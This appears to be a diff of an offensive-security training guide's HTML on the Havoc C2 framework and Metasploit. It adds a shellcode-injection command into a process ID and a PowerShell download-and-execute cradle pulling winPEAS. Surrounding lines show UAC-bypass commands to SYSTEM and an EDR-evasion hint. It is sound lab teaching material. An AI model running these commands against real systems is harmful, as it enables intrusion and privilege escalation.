@@ -345,15 +345,20 @@ Demon {
 <p><img src="./images/havoc_interact1.jpg" alt="Screenshot" /></p>
 <p><img src="./images/havoc_interact2.jpg" alt="Screenshot" /></p>
 <h1><a class="header" href="#havoc-modules" id="havoc-modules">Havoc Modules</a></h1>
-<p>dotnet
+<p><em><strong>dotnet</strong></em>
 inline-execute
 execute</p>
-<p>Inline - execute (BOF Loader!!!)</p>
+<p><em><strong>Inline - execute (BOF Loader!!!)</strong></em></p>
 <blockquote>
 <p>OPSEC Hint : When running the shell command, the process hosting your beacon/implant will spawn a child process, run the command and exit the child process. This is quite noisy compared to running everything in memory in the same process. Also command-line logging (eventlogs, sysmon and EDR's will log the commands.)</p>
 </blockquote>
 <p><em><strong>shell</strong></em></p>
+<p><em><strong>shellcode</strong></em> </p>
+<pre><code class="language-code">shellcode inject x64 6556 /opt/havoc/payloads/demon.x64.bin
+</code></pre>
+<blockquote>
 <p>Explain sacrificial process - advatages/disadvantages (command line logging, stability, patching, not touching other processes)</p>
+</blockquote>
 <h1><a class="header" href="#chapter-11---metasploit-basics" id="chapter-11---metasploit-basics">Chapter 1.1 - Metasploit Basics</a></h1>
 <p>Log on to your Unbuntu VM with <strong>admin/admin</strong>, open a terminal prompt and start the metasploit console:</p>
 <pre><code class="language-code">msfconsole
@@ -569,6 +574,10 @@ make
 <pre><code class="language-code">uac-bypass sspidatagram c:\windows\system32\cmd.exe
 uac-bypass sspidatagram c:\temp\demon.x64.exe -&gt; NT Authority\System
 uac-bypass silentcleanup /opt/havoc/payloads/demon.x64.exe -&gt; error
+</code></pre>
+<hr />
+<p>Priv Esc.</p>
+<pre><code class="language-powershell">powershell &quot;IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')&quot;
 </code></pre>
 <h1><a class="header" href="#amsi-anti-malware-scanning-interface" id="amsi-anti-malware-scanning-interface">AMSI (Anti-Malware Scanning Interface)</a></h1>
 <blockquote>
